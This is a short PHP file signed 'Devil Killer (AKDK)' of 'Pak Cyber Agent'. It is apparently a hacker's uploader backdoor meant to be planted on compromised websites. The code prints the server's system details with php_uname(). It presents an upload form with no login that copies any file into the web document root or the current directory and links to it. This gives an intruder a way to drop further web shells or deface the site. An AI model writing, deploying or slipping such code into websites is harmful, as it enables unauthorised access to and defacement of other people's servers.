<?php echo "<center><font color=green><i>Uploader By Devil Killer (AKDK) :::</i>

Pak Cyber Agent</font></center>

 <center><font color=red><br><br>"; echo "<b>".php_uname()."</b><br>"; echo "<form method='post' enctype='multipart/form-data'> <br><br></font></center>

 <center><input type='file' name='idx_file'> 

 <input type='submit' name='upload' value='upload'> 

 </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['idx_file']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) {
    if(is_writable($root)) {  

 if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {     

 $web = "http://".$_SERVER['HTTP_HOST']."/"; 


 echo "Uploaded By AKDK :: <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";         

 } 

 else {             echo "gagal upload di document VIP Room.";         

 }

 }

 else {         if(@copy($_FILES['idx_file']['tmp_name'], $files))

 {

     echo "sukses upload <b>$files</b> di kamar ini"; 

     }

     else {             echo "gagal upload";         

     }

     }

     } 

     ?>
</center>

<body style='background-color:pink'>
